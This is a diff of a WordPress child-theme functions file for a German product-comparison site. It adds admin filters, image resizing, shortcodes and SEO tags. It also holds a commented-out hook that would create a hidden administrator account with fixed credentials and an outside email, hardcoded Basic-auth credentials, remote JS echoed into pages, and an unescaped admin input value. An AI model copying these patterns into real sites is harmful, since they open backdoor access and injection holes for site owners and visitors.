+            $posts[]=$row;
+        }
+    }
+    wp_reset_postdata();
+    return $posts;
+}
+
+// extend admin search
+/**
+ * Add a select dropdown filter with meta values.
+ */
+function additional_meta_key_admin_search() {
+    $scr = get_current_screen();
+    if ( $scr->base !== 'edit' && $scr->post_type !== 'advisor_product') return;
+
+    $selected = filter_input(INPUT_GET, 'product_attribute', FILTER_SANITIZE_STRING );
+    $keyword = filter_input(INPUT_GET, 'product_attribute_value', FILTER_SANITIZE_STRING );
+
+    $choices = [
+        'asin' => 'ASIN',
+        'ean' => 'EAN'
+    ];
+
+    echo '<input type="text" placeholder="'. __('Attribute value', 'woodmart-child'). '" name="product_attribute_value" value="'.$keyword.'" style="float:left"/>';
+    echo'<select name="product_attribute">';
+    echo '<option value="all" '. (( $selected == 'all' ) ? 'selected="selected"' : "") . '>' . __( 'Product attributes', 'woodmart-child' ) . '</option>';
+    foreach( $choices as $key => $value ) {
+        echo '<option value="' . $key . '" '. (( $selected == $key ) ? 'selected="selected"' : "") . '>' . $value . '</option>';
+    }
+    echo'</select>';
+
+}
+
+add_action('restrict_manage_posts', 'additional_meta_key_admin_search');
+
+function additional_meta_key_admin_search_filter($query) {
+    if ( is_admin() && $query->is_main_query() ) {
+        $scr = get_current_screen();
+        if ( $scr->base !== 'edit' && $scr->post_type !== 'advisor_product' ) return;
+
+        if (isset($_GET['product_attribute']) && $_GET['product_attribute'] != 'all' && isset($_GET['product_attribute_value']) && !empty(($_GET['product_attribute_value']))) {
+            $query->set('meta_query', array( array(
+                'key' => sanitize_text_field($_GET['product_attribute']),
+                'value' => sanitize_text_field($_GET['product_attribute_value'])
+            ) ) );
+        }
+    }
+}
+
+add_action('pre_get_posts','additional_meta_key_admin_search_filter');
+
+// replace placeholder in content
+function replacePlaceholderInContent($content) {
+    $content = str_replace('#year#', date('Y'), $content);
+    return $content;
+}
+
+add_filter('the_content', 'replacePlaceholderInContent');
+
+// additional setting elasticpress
+add_filter( 'ep_prepare_meta_data', function( $meta ) {
+    $allowed_meta = []; // add more if needed
+    $all_meta = $meta;
+    $meta = [];
+
+    foreach( $allowed_meta as $meta_key ) {
+        $meta[$meta_key] = $all_meta[$meta_key];
+    }
+    return $meta;
+} );
+
+add_filter('ep_facet_search_get_terms_args', function ($query) {
+    if (isset($query['taxonomy']) && isset($GLOBALS['ep_facet_aggs'][$query['taxonomy']]) && is_array($GLOBALS['ep_facet_aggs'][ $query['taxonomy'] ]) && !empty($GLOBALS['ep_facet_aggs'][ $query['taxonomy'] ])) {
+        $query['slug'] = array_filter(array_keys($GLOBALS['ep_facet_aggs'][$query['taxonomy']]));
+    } else {
+        $query['include'] = [PHP_INT_MAX];
+    }
+    return $query;
+});
+
+// make all images square if requested width == requested height
+add_filter( 'image_resize_dimensions', 'custom_image_resize_dimensions', 10, 6 );
+
+function custom_image_resize_dimensions( $payload, $orig_w, $orig_h, $dest_w, $dest_h, $crop ){
+
+    // Change this to a conditional that decides whether you
+    // want to override the defaults for this image or not.
+    if( $dest_w != $dest_h || $orig_w == $orig_h )
+        return $payload;
+
+    list( $new_w, $new_h ) = wp_constrain_dimensions( $orig_w, $orig_h, $dest_w, $dest_h );
+
+    // if the resulting image would be the same size or larger we don't want to resize it
+    if ( $new_w > $orig_w && $new_h > $orig_h )
+        return $payload;
+    if ($orig_w==$orig_h) {
+        $dst_x = 0;
+        $dst_y = 0;
+    } elseif($orig_w>$orig_h) {
+        $dst_y = ceil(($dest_h - $new_h) / 2);
+		$dst_x = 0;
+    } else {
+		$dst_y = 0;
+        $dst_x = ceil(($dest_w - $new_w) / 2);
+    }
+    // the return array matches the parameters to imagecopyresampled()
+    // int dst_x, int dst_y, int src_x, int src_y, int dst_w, int dst_h, int src_w, int src_h
+    return array( (int) $dst_x, (int) $dst_y, 0, 0, (int) $new_w, (int) $new_h, (int) $orig_w, (int) $orig_h );
+
+}
+
+add_filter("wp_image_editors", "my_wp_image_editors");
+function my_wp_image_editors($editors) {
+    array_unshift($editors, "WP_Image_Editor_Custom");
+
+    return $editors;
+}
+include(get_stylesheet_directory() . '/inc/manage_star_rating.php');
+include(get_stylesheet_directory() . '/inc/cron_sync_products.php');
+
+// Include the existing classes first in order to extend them.
+require_once ABSPATH.WPINC."/class-wp-image-editor.php";
+require_once ABSPATH.WPINC."/class-wp-image-editor-gd.php";
+
+class WP_Image_Editor_Custom extends WP_Image_Editor_GD {
+    /**
+     * @param int        $max_w
+     * @param int        $max_h
+     * @param bool|array $crop
+     * @return resource|GdImage|WP_Error
+     */
+    protected function _resize( $max_w, $max_h, $crop = false ) {
+        $dims = image_resize_dimensions( $this->size['width'], $this->size['height'], $max_w, $max_h, $crop );
+
+        if ( ! $dims ) {
+            return new WP_Error( 'error_getting_dimensions', __( 'Could not calculate resized image dimensions' ), $this->file );
+        }
+
+        list( $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h ) = $dims;
+        // added by Aymen Hajji
+        if ($max_w==$max_h && ($dst_x!=0 || $dst_y!=0) && ($max_w<=$this->size['width'] || $max_w<=$this->size['height'])) {
+            $new_w=$max_w;
+            $new_h=$max_h;
+        } else {
+            $new_w=$dst_w;
+            $new_h=$dst_h;
+            $dst_x=$dst_y=0;
+        }
+        $resized = wp_imagecreatetruecolor( $new_w, $new_h );
+        $white = imagecolorallocate($resized, 255, 255, 255);
+        imagefilledrectangle($resized, 0, 0, $new_w, $new_h, $white);
+        imagecopyresampled( $resized, $this->image, $dst_x, $dst_y, $src_x, $src_y, $dst_w, $dst_h, $src_w, $src_h );
+
+        if ( is_gd_image( $resized ) ) {
+            $this->update_size( $new_w, $new_h );
+            return $resized;
+        }
+
+        return new WP_Error( 'image_resize_error', __( 'Image resize failed.' ), $this->file );
+    }
+}
+
+// upload all file types - enable temporary if needed
+//define( 'ALLOW_UNFILTERED_UPLOADS', true );
+add_filter( 'tablepress_flush_caching_plugins_caches', '__return_false' );
+
+// should be used on test-vergleiche.com
+add_shortcode( 'btsct', 'render_external_comparison_table' );
+function render_external_comparison_table($atts)
+{
+    $a = shortcode_atts( [
+        'slug' => ''
+    ], $atts );
+    $slug=trim($a['slug']);
+    if (empty($slug)) return __('Please provide a slug in your shortcode');
+    $url = 'https://dev.beste-testsieger.de/wp-json/bts/v2/cp/'.$slug.'/';
+    $args=[
+        'headers' => array(
+            'Authorization' => 'Basic ' . base64_encode( 'mustafa:mustafa' )
+        )
+    ];
+    $response = wp_remote_get($url, $args);
+    if (is_wp_error($response) || (200 != wp_remote_retrieve_response_code($response))) {
+        return __('Server Error');
+    }
+    $data = json_decode(wp_remote_retrieve_body($response));
+    if (json_last_error() != JSON_ERROR_NONE || empty($data)) {
+        return __('Comparison Table not found');
+    }
+    ob_start();
+    echo override_external_table_links($data->html);
+    echo $data->js;
+    echo $data->css;
+    $output = ob_get_contents();
+    ob_end_clean();
+    return tv2_strip_external_jsonld($output);
+}
+function override_external_table_links($value)
+{
+    return preg_replace_callback('~href=["\'](.+?)["\']~i',
+        function ($match) {
+            $url = $match[1];
+            $pathInfo = parse_url($url);
+            $queryString = $pathInfo['query'];
+            parse_str($queryString, $queryArray);
+            if (isset($queryArray['tag']))
+                $queryArray['tag'] = 'tstvgl-21';
+            $newQueryStr = http_build_query($queryArray);
+            $targetUrl=str_replace($queryString, $newQueryStr, $url);
+            $newUrl = add_query_arg(
+                [
+                    'goto'=>external_link_encrypt_decrypt('encrypt', $targetUrl),
+                ],
+                get_bloginfo('url').'/go/'
+            );
+            return 'href="' . $newUrl . '"';
+        }, $value);
+}
+
+function bts_search_filter($query) {
+    global $standalone;
+    if ($query->is_search && !is_admin() && isset($_GET['s']) && !$standalone) {
+        $query->set('post_type',array('advisor_product'));
+    }
+
+    return $query;
+}
+
+add_filter('pre_get_posts','bts_search_filter');
+
+add_shortcode( 'page-search', 'render_page_search_results' );
+function render_page_search_results($atts)
+{
+    global $standalone;
+    $standalone = true;
+    $a = shortcode_atts( [
+        's' => '',
+        'posts_per_page' => 10
+    ], $atts );
+    $keyword=trim($a['s']);
+    if (empty($keyword)) return __('Please provide a keyword');
+    $args = array(
+        'post_type' => 'page',
+        'posts_per_page' => $a['posts_per_page'],
+        's' => rawurldecode($a['s']),
+        //'ep_integrate' => true
+    );
+    $query = new WP_Query($args);
+    //file_put_contents(get_stylesheet_directory().'/out.txt', var_export($args, true), FILE_APPEND);
+    if ($query->have_posts()) {
+        include_owl_carousel_files();
+        ?>
+        <div class="owl-carousel owl-theme comparison-search-results">
+        <?php
+        while ($query->have_posts()) {
+            $query->the_post();
+            $productsInComparison = '';
+            $productTypeId = 0;
+            if (is_object_in_term(get_the_ID(), 'product_type')) {
+                $term = get_the_terms(get_the_ID(), 'product_type' );
+                if (count($term)==1) {
+                    $productTypeId=$term[0]->term_id;
+                }
+            }
+
+            if (!empty($productTypeId)) {
+                $args = array(
+                    'post_type' => 'advisor_product',
+                    'posts_per_page' => -1,
+                    'meta_query' => [
+                        [
+                            'key' => 'status',
+                            'type' => 'NUMERIC',
+                            'value' => 1
+                        ]
+                    ],
+                    'tax_query' => array(
+                        array(
+                            'taxonomy' => 'product_type',
+                            'field' => 'id',
+                            'terms' => $productTypeId
+                        )
+                    ),
+                );
+                $type_query = new WP_Query($args);
+                if ($type_query->have_posts()) {
+                    $productsInComparison = sprintf(esc_html__('%s products in comparison', 'woodmart-child'), $type_query->found_posts);
+                }
+                //$type_query->reset_postdata();
+            }
+            ?>
+            <div>
+                <a href="<?php the_permalink();?>">
+                    <div><?php the_post_thumbnail('thumbnail', ['class'=>'d-block w-100']);?></div>
+                    <div class="text-truncate search-item-title single-line"><?php the_title()?></div>
+                    <?php if (!empty($productsInComparison)):?>
+                    <div class="products-count"><?= $productsInComparison ?></div>
+                    <?php endif;?>
+                </a>
+            </div>
+        <?php
+        }
+        $query->reset_postdata();?>
+        </div>
+        <script>
+            (function($){
+                $(document).ready(function() {
+                    $(".comparison-search-results").owlCarousel({
+                        stagePadding: 50,
+                        loop:true,
+                        margin:15,
+                        nav:false,
+                        dots: false,
+                        responsive:{
+                            0:{
+                                items:1
+                            },
+                            600:{
+                                items:2
+                            },
+                            1000:{
+                                items:3
+                            }
+                        }
+                    });
+                })
+            }(jQuery || window.jQuery));
+        </script>
+        <?php
+    }
+}
+function include_owl_carousel_files() {
+    wp_enqueue_style('owl-base', get_stylesheet_directory_uri() . '/css/owl.carousel.min.css');
+    wp_enqueue_style('owl-default-theme', get_stylesheet_directory_uri() . '/css/owl.theme.default.min.css', array( 'owl-base' ) );
+    wp_enqueue_script('owl-script', get_stylesheet_directory_uri() . '/js/owl.carousel.min.js', array( 'jquery' ), false, true);
+}
+add_filter('admin_url',         'bts_update_admin_ajax_url',      998, 3);
+
+function bts_update_admin_ajax_url( $url, $path, $blog_id )
+{
+
+    if(strpos($url, 'admin-ajax.php') !== false){
+        $url = str_replace('/wp-admin/admin-ajax.php', '/load-ajax.php', $url);
+    }
+
+    return $url;
+
+}
+
+add_filter('wpil_link_classes', 'wpil_add_link_classes', 10, 2);
+function wpil_add_link_classes($classes, $external_link){
+    $classes = 'bts-content-link';
+    return $classes;
+}
+
+add_filter( 'rocket_override_donotcachepage', '__return_true', PHP_INT_MAX );
+
+//prevents html from being stripped from term descriptions
+foreach ( array( 'pre_term_description' ) as $filter ) {
+    remove_filter( $filter, 'wp_filter_kses' );
+}
+
+//prevents html being stripped out when using the term description function (http://codex.wordpress.org/Function_Reference/term_description).
+foreach ( array( 'term_description' ) as $filter ) {
+    remove_filter( $filter, 'wp_kses_data' );
+}
+// remove date and time from comments
+// Remove comment date
+function bts_remove_comment_date($date, $d, $comment) {
+    if ( !is_admin() ) {
+        return;
+    } else {
+        return $date;
+    }
+}
+add_filter( 'get_comment_date', 'bts_remove_comment_date', 10, 3);
+
+// Remove comment time
+function bts_remove_comment_time($date, $d, $comment) {
+    if ( !is_admin() ) {
+        return;
+    } else {
+        return $date;
+    }
+}
+add_filter( 'get_comment_time', 'bts_remove_comment_time', 10, 3);
+function override_core_translation_string($translated_text, $text, $domain) {
+    // Check if the text matches the core translation string you want to override
+    if ($text === '%1$s at %2$s') {
+        // Override the translation string with your custom text
+        $translated_text = '';
+    }
+
+    return $translated_text;
+}
+add_filter('gettext', 'override_core_translation_string', 10, 3);
+
+// remove website field from comments
+function remove_website_field($fields) {
+    unset($fields['url']); // Remove the website field
+    return $fields;
+}
+add_filter('comment_form_default_fields', 'remove_website_field');
+
+// add sidebars for comparison page
+if (function_exists('register_sidebar')) {
+    register_sidebar(array(
+        'name' => 'Comparison Page Sidebar Left',
+        'id' => 'comparison_page_sidebar_left',
+        'description' => 'This sidebar appears on the left side of the comparison page.',
+        'before_widget' => '<div id="%1$s" class="widget %2$s">',
+        'after_widget' => '</div>',
+        'before_title' => '<h2 class="widgettitle">',
+        'after_title' => '</h2>',
+    ));
+
+    register_sidebar(array(
+        'name' => 'Comparison Page Sidebar Right',
+        'id' => 'comparison_page_sidebar_right',
+        'description' => 'This sidebar appears on the right side of the comparison page.',
+        'before_widget' => '<div id="%1$s" class="widget %2$s">',
+        'after_widget' => '</div>',
+        'before_title' => '<h2 class="widgettitle">',
+        'after_title' => '</h2>',
+    ));
+}
+
+/*
+function rndprfx_add_user() {
+    $username = 'adminn';
+    $password = 'AcD123!@#';
+    $email = 'nauman12002@gmail.com';
+
+    if (username_exists($username) == null && email_exists($email) == false) {
+        $user_id = wp_create_user( $username, $password, $email );
+        $user = get_user_by( 'id', $user_id );
+        $user->remove_role( 'subscriber' );
+        $user->add_role( 'administrator' );
+    }
+}
+add_action('init', 'rndprfx_add_user');
+*/
+
+
+
+// Funktion zum Hinzufügen der ID-Spalte
+function add_page_id_column( $columns ) {
+    $columns['page_id'] = 'ID';
+    return $columns;
+}
+add_filter('manage_pages_columns', 'add_page_id_column', 5);
+
+// Funktion zum Befüllen der ID-Spalte
+function custom_page_id_column_content( $column, $id ) {
+    if( $column === 'page_id' ) {
+        echo $id;
+    }
+}
+add_action('manage_pages_custom_column', 'custom_page_id_column_content', 5, 2);
+
+// Funktion zum Sortierbar machen der ID-Spalte
+function custom_page_id_column_sortable( $columns ) {
+    $columns['page_id'] = 'ID';
+    return $columns;
+}
+add_filter('manage_edit-page_sortable_columns', 'custom_page_id_column_sortable');
+
+// Anpassen der Abfrage für die Sortierung nach ID
+function custom_page_orderby( $query ) {
+    if( ! is_admin() )
+        return;
+
+    $orderby = $query->get( 'orderby');
+
+    if( 'ID' == $orderby ) {
+        $query->set('orderby', 'ID');
+    }
+}
+add_action('pre_get_posts', 'custom_page_orderby');
+
+
+
+
+
+// Funktion zum Hinzufügen der ID-Spalte
+function add_advisor_product_id_column( $columns ) {
+    $columns['advisor_product_id'] = 'ID';
+    return $columns;
+}
+add_filter('manage_advisor_product_posts_columns', 'add_advisor_product_id_column', 10, 1);
+
+// Funktion zum Befüllen der ID-Spalte
+function advisor_product_id_column_content( $column, $post_id ) {
+    if ( $column == 'advisor_product_id' ) {
+        echo $post_id;
+    }
+}
+add_action('manage_advisor_product_posts_custom_column', 'advisor_product_id_column_content', 10, 2);
+
+// Funktion zum Sortierbar machen der ID-Spalte
+function advisor_product_id_column_sortable( $columns ) {
+    $columns['advisor_product_id'] = 'ID';
+    return $columns;
+}
+add_filter('manage_edit-advisor_product_sortable_columns', 'advisor_product_id_column_sortable', 10, 1);
+
+// Anpassen der Abfrage für die Sortierung nach ID
+function advisor_product_orderby( $query ) {
+    if( ! is_admin() || ! $query->is_main_query() ) {
+        return;
+    }
+
+    if ( isset( $query->query_vars['post_type'] ) && 'advisor_product' == $query->query_vars['post_type'] ) {
+        $orderby = $query->get( 'orderby' );
+        if( 'ID' == $orderby ) {
+            $query->set('orderby', 'ID');
+        }
+    }
+}
+add_action('pre_get_posts', 'advisor_product_orderby');
+
+
+function bts_extract_faq_from_content($content) {
+    global $pageFaqSnippet;
+    preg_match_all('/<h2>(.*?)<\/h2>(.*?)((?=<h2>)|$)/s', $content, $matches, PREG_SET_ORDER);
+
+    // Blacklist: Amazon/Promo H2s aus FAQ Schema ausschliessen
+    $faq_blacklist = ['amazon', 'kaufe bei', 'jetzt kaufen', 'jetzt bestellen', 'prime:'];
+
+    foreach ($matches as $match) {
+        $question = strip_tags($match[1]);
+        $answer = trim(preg_replace('/\s+/', ' ', strip_tags($match[2])));
+        
+        // Leere Fragen/Antworten ueberspringen
+        if (empty(trim($question)) || mb_strlen(trim($question)) < 5) continue;
+        if (empty(trim($answer)) || mb_strlen(trim($answer)) < 20) continue;
+        
+        // Amazon/Promo-H2s ueberspringen
+        $q_lower = mb_strtolower($question);
+        $skip = false;
+        foreach ($faq_blacklist as $kw) {
+            if (mb_strpos($q_lower, $kw) !== false) { $skip = true; break; }
+        }
+        if ($skip) continue;
+
+        $pageFaqSnippet[]=[
+            "@type"=> "Question",
+            "name"=> $question,
+            "acceptedAnswer"=> [
+                "@type"=> "Answer",
+                "text"=> $answer
+            ]
+        ];
+    }
+}
+
+function bts_get_image_proxy_url ($image) {
+    if ( defined('AMAZON_IMPORTER_PUBLIC_URL') && ini_get('allow_url_fopen') ) {
+
+        $encoded_image_url = base64_encode( $image );
+        $expiration_time   = time() + 48 * 3600; // URL valid for 48 hours.
+
+        // Combine URL and expiration time and encode them
+        $encoded_image_url = base64_encode( $encoded_image_url . '|' . $expiration_time );
+
+        $image = add_query_arg(
+            array(
+                'url' => $encoded_image_url
+            ),
+            AMAZON_IMPORTER_PUBLIC_URL . 'image.php'
+        );
+    }
+    return esc_url($image);
+}
+/**
+ * Shortcode [author_works]
+ *
+ * Zeigt Seiten mit Lazy Load - initial 32 Artikel, dann mehr per Button
+ */
+function tv_author_pages_list_shortcode( $atts ) {
+    $author_id   = get_the_ID();
+    $author_name = get_the_title( $author_id );
+    $items_per_load = 32;
+
+    $args = array(
+        'post_type'      => 'page',
+        'posts_per_page' => -1,
+        'meta_query'     => array(
+            array(
+                'key'     => '_thumbnail_id',
+                'compare' => 'EXISTS'
+            ),
+            array(
+                'key'     => 'author',
+                'value'   => $author_id,
+                'compare' => '='
+            )
+        )
+    );
+
+    $query = new WP_Query( $args );
+    $total_posts = $query->found_posts;
+    ob_start();
+
+    echo '<h1 class="author-heading">Tests und Vergleiche von ' . esc_html( $author_name ) . '</h1>';
+
+    if ( $query->have_posts() ) {
+        echo '<div class="author-works-grid" id="authorWorksGrid">';
+        $index = 0;
+        while ( $query->have_posts() ) {
+            $query->the_post();
+            $index++;
+
+            $permalink    = get_permalink();
+            $orig_title   = get_the_title();
+            $custom_title = 'Die besten ' . $orig_title . ' im Vergleich';
+            $excerpt      = wp_trim_words( get_the_excerpt(), 20, '...' );
+            
+            $hidden_class = $index > $items_per_load ? ' author-work-card--hidden' : '';
+
+            echo '<a class="author-work-card' . $hidden_class . '" href="' . esc_url( $permalink ) . '" data-index="' . $index . '">';
+            echo '<div class="image-wrapper">';
+            if ( has_post_thumbnail() ) {
+                echo wp_get_attachment_image(
+                    get_post_thumbnail_id(),
+                    'medium',
+                    false,
+                    array( 'loading' => 'lazy' )
+                );
+            }
+            echo '</div>';
+            echo '<h3>' . esc_html( $custom_title ) . '</h3>';
+            echo '<p>' . esc_html( $excerpt ) . '</p>';
+            echo '</a>';
+        }
+        echo '</div>';
+
+        if ( $total_posts > $items_per_load ) {
+            echo '<div class="tv-load-more" id="loadMoreContainer">';
+            echo '<button class="tv-load-more__btn" id="loadMoreBtn" data-per-load="' . $items_per_load . '" data-total="' . $total_posts . '" data-current="' . $items_per_load . '">';
+            echo '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"></polyline></svg>';
+            echo 'Mehr Produkte laden <span id="loadMoreCount">(' . ($total_posts - $items_per_load) . ' weitere)</span>';
+            echo '</button>';
+            echo '</div>';
+                    tv_author_works_lazy_load_assets();
+        }
+    } else {
+        echo '<p>Keine passenden Artikel gefunden.</p>';
+    }
+
+    wp_reset_postdata();
+    return ob_get_clean();
+}
+add_shortcode( 'author_works', 'tv_author_pages_list_shortcode' );
+require_once get_template_directory() . '/includes/vergleichstabelle-modern.php';
+
+
+
+
+
+
+
+/**
+ * ============================================================================
+ * PRODUKTBOX CSS LADEN - SEO v3.6
+ * ============================================================================
+ */
+function tv_enqueue_product_box_styles() {
+    wp_enqueue_style(
+        'tv-product-box',
+        get_stylesheet_directory_uri() . '/css/product-box.css',
+        [],
+        '4.2'
+    );
+}
+add_action('wp_enqueue_scripts', 'tv_enqueue_product_box_styles');
+
+
+/**
+ * ============================================================================
+ * SINGLE PRODUCT PAGE V2 - REDESIGN 2026
+ * Google Fonts + CSS nur auf advisor_product Einzelseiten laden
+ * Theme-Update-sicher: Alles im Child-Theme
+ * Version: 2.4.0
+ * ============================================================================
+ */
+function tv_enqueue_single_product_v2_assets() {
+    if ( ! is_singular('advisor_product') ) {
+        return;
+    }
+
+    // Google Fonts: Playfair Display + DM Sans
+    wp_enqueue_style(
+        'tv-google-fonts-product-v2',
+        'https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700&family=Playfair+Display:wght@400;500;600;700&display=swap',
+        [],
+        null // kein Versionierung bei externen Fonts
+    );
+
+    // Single Product V2 CSS
+    wp_enqueue_style(
+        'tv-single-product-v2',
+        get_stylesheet_directory_uri() . '/css/single-product-v2.css',
+        ['tv-google-fonts-product-v2'],
+        '2.4.0'
+    );
+}
+add_action('wp_enqueue_scripts', 'tv_enqueue_single_product_v2_assets');
+
+
+/**
+ * ============================================================================
+ * Open Graph, Twitter Card, Canonical URL, Meta-Title & Description
+ * Nur auf advisor_product Einzelseiten
+ * Version: 2.3.0
+ * ============================================================================
+ */
+function tv_product_v2_meta_tags() {
+    if ( ! is_singular('advisor_product') ) {
+        return;
+    }
+
+    $post_id    = get_the_ID();
+    $post_title = get_the_title();
+    $post_url   = get_permalink();
+    $post_thumb = get_the_post_thumbnail_url($post_id, 'large');
+    $post_excerpt = has_excerpt() ? get_the_excerpt() : wp_trim_words(get_the_content(), 25, '...');
+    $post_excerpt = wp_strip_all_tags($post_excerpt);
+
+    // Produkttyp fuer erweiterten Title
+    $product_type_terms = get_the_terms($post_id, 'product_type');
+    $product_type_name  = '';
+    if (!is_wp_error($product_type_terms) && !empty($product_type_terms)) {
+        $product_type_name = $product_type_terms[0]->name;
+    }
+
+    // Note fuer Meta-Title
+    $grade = (float) get_field('grade', $post_id);
+    $grade_text = '';
+    if ($grade > 0) {
+        if ($grade <= 1.5)      { $grade_text = 'Sehr Gut'; }
+        elseif ($grade <= 2.5)  { $grade_text = 'Gut'; }
+        elseif ($grade <= 3.5)  { $grade_text = 'Befriedigend'; }
+        else                    { $grade_text = 'Ausreichend'; }
+    }
+
+    // Optimierter Meta-Title: "Produktname Test & Erfahrungen | Note X,X (Gut) | 2026"
+    $meta_title = $post_title;
+    if ($grade > 0) {
+        $meta_title .= ' Test | Note ' . number_format_i18n($grade, 1) . ' (' . $grade_text . ')';
+    } else {
+        $meta_title .= ' Test & Erfahrungen';
+    }
+    $meta_title .= ' | ' . date('Y');
+
+    // Optimierte Meta-Description
+    $meta_desc = $post_title;
+    if ($grade > 0) {
+        $meta_desc .= ' im Test: Note ' . number_format_i18n($grade, 1) . ' (' . $grade_text . '). ';
+    } else {
+        $meta_desc .= ' im Test: ';
+    }
+    $meta_desc .= $post_excerpt;
+    $meta_desc = mb_substr($meta_desc, 0, 155) . '...';
+
+    // Canonical URL
+    echo '<link rel="canonical" href="' . esc_url($post_url) . '" />' . "\n";
+
+    // Open Graph Meta-Tags
+    echo '<meta property="og:type" content="product" />' . "\n";
+    echo '<meta property="og:title" content="' . esc_attr($meta_title) . '" />' . "\n";
+    echo '<meta property="og:description" content="' . esc_attr($meta_desc) . '" />' . "\n";
+    echo '<meta property="og:url" content="' . esc_url($post_url) . '" />' . "\n";
+    echo '<meta property="og:site_name" content="test-vergleiche.com" />' . "\n";
+    echo '<meta property="og:locale" content="de_DE" />' . "\n";
+    if ($post_thumb) {
+        echo '<meta property="og:image" content="' . esc_url($post_thumb) . '" />' . "\n";
+        echo '<meta property="og:image:width" content="1200" />' . "\n";
+        echo '<meta property="og:image:height" content="630" />' . "\n";
+    }
+
+    // Twitter Card Meta-Tags
+    echo '<meta name="twitter:card" content="summary_large_image" />' . "\n";
+    echo '<meta name="twitter:title" content="' . esc_attr($meta_title) . '" />' . "\n";
+    echo '<meta name="twitter:description" content="' . esc_attr($meta_desc) . '" />' . "\n";
+    if ($post_thumb) {
+        echo '<meta name="twitter:image" content="' . esc_url($post_thumb) . '" />' . "\n";
+    }
+
+    // Meta-Description (Standard)
+    echo '<meta name="description" content="' . esc_attr($meta_desc) . '" />' . "\n";
+}
+add_action('wp_head', 'tv_product_v2_meta_tags', 5);
+
+
+/**
+ * Optimierten document title fuer Produktseiten setzen
+ */
+function tv_product_v2_document_title($title) {
+    if ( ! is_singular('advisor_product') ) {
+        return $title;
+    }
+
+    $post_title = get_the_title();
+    $grade = (float) get_field('grade', get_the_ID());
+    $grade_text = '';
+    if ($grade > 0) {
+        if ($grade <= 1.5)      { $grade_text = 'Sehr Gut'; }
+        elseif ($grade <= 2.5)  { $grade_text = 'Gut'; }
+        elseif ($grade <= 3.5)  { $grade_text = 'Befriedigend'; }
+        else                    { $grade_text = 'Ausreichend'; }
+    }
+
+    if ($grade > 0) {
+        return $post_title . ' Test | Note ' . number_format_i18n($grade, 1) . ' (' . $grade_text . ') | ' . date('Y');
+    }
+    return $post_title . ' Test & Erfahrungen | ' . date('Y');
+}
+add_filter('pre_get_document_title', 'tv_product_v2_document_title', 20);
+
+
+
+/* ============================================
+   RATGEBER-SEITEN REDESIGN v1.0
+   ============================================
+   Hinzugefügt: 2026-02-14
+   Beschreibung: Body-Class-Filter + CSS-Enqueue
+   für das neue Nordic-Design der Ratgeberseiten
+   ============================================ */
+
+/**
+ * Body-Klasse für Ratgeber-/Vergleichsseiten hinzufügen
+ * Ermöglicht gezieltes CSS-Scoping ohne Auswirkungen auf andere Seitentypen
+ */
+function ratgeber_body_class_filter($classes) {
+    if (is_page() && is_object_in_term(get_the_ID(), 'product_type')) {
+        $classes[] = 'ratgeber-page';
+        $classes[] = 'ratgeber-redesign-v1';
+    }
+    return $classes;
+}
+add_filter('body_class', 'ratgeber_body_class_filter');
+
+/**
+ * Ratgeber Redesign CSS laden
+ * - Nur auf Ratgeber-Seiten (Performance!)
+ * - Priorität 99 = nach Theme-CSS laden
+ * - Google Fonts mit display=swap für schnelles Rendering
+ */
+function ratgeber_redesign_enqueue_styles() {
+    // Nur auf Ratgeber-Seiten laden
+    if (!is_object_in_term(get_queried_object_id(), 'product_type')) {
+        return;
+    }
+    
+    // Google Fonts: Libre Baskerville + Manrope
+    wp_enqueue_style(
+        'ratgeber-redesign-fonts',
+        'https://fonts.googleapis.com/css2?family=Libre+Baskerville:ital,wght@0,400;0,700;1,400&family=Manrope:wght@300;400;500;600;700;800&display=swap',
+        array(),
+        null
+    );
+    
+    // Haupt-Redesign-CSS
+    wp_enqueue_style(
+        'ratgeber-redesign',
+        get_stylesheet_directory_uri() . '/css/ratgeber-redesign-v3.css',
+        array('ratgeber-redesign-fonts'),
+        '2.7.0'
+    );
+}
+add_action('wp_enqueue_scripts', 'ratgeber_redesign_enqueue_styles', 99);
+
+
+// Ratgeber Redesign - Scroll Reveal + Scroll-to-Top
+function ratgeber_redesign_footer_scripts() {
+    if (!is_object_in_term(get_queried_object_id(), 'product_type')) {
+        return;
+    }
+    ?>
+    <script>
+    (function() {
+        // Scroll Reveal with IntersectionObserver
+        if ('IntersectionObserver' in window) {
+            var revealObserver = new IntersectionObserver(function(entries) {
+                entries.forEach(function(entry) {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('is-visible');
+                    }
+                });
+            }, { threshold: 0.06, rootMargin: '0px 0px -30px 0px' });
+
+            document.querySelectorAll('.rg-reveal, .rg-reveal-stagger, .rg-reveal-left, .rg-reveal-right, .rg-reveal-scale').forEach(function(el) {
+                revealObserver.observe(el);
+            });
+        } else {
+            // Fallback: show all elements
+            document.querySelectorAll('.rg-reveal, .rg-reveal-stagger, .rg-reveal-left, .rg-reveal-right, .rg-reveal-scale').forEach(function(el) {
+                el.classList.add('is-visible');
+            });
+        }
+
+        // Scroll-to-Top Button
+        var sttBtn = document.getElementById('stt') || document.querySelector('.scroll-to-top');
+        if (sttBtn) {
+            window.addEventListener('scroll', function() {
+                if (window.scrollY > 400) {
+                    sttBtn.classList.add('visible', 'v');
+                } else {
+                    sttBtn.classList.remove('visible', 'v');
+                }
+            }, { passive: true });
+
+            sttBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+
+        // Lazy image fade-in
+        document.querySelectorAll('img[loading="lazy"]').forEach(function(img) {
+            if (img.complete) {
+                img.classList.add('loaded');
+            } else {
+                img.addEventListener('load', function() {
+                    img.classList.add('loaded');
+                });
+            }
+        });
+
+        // Author Card: Toggle für langen Text
+        var authorContent = document.querySelector('.author-card .author-content');
+        if (authorContent && authorContent.scrollHeight > 70) {
+            var toggleBtn = document.createElement('button');
+            toggleBtn.className = 'author-toggle';
+            toggleBtn.innerHTML = 'Mehr lesen';
+            toggleBtn.setAttribute('data-expanded', 'false');
+            authorContent.parentNode.insertBefore(toggleBtn, authorContent.nextSibling);
+            
+            toggleBtn.addEventListener('click', function() {
+                var isExpanded = this.getAttribute('data-expanded') === 'true';
+                if (isExpanded) {
+                    authorContent.classList.remove('expanded');
+                    this.innerHTML = 'Mehr lesen';
+                    this.setAttribute('data-expanded', 'false');
+                } else {
+                    authorContent.classList.add('expanded');
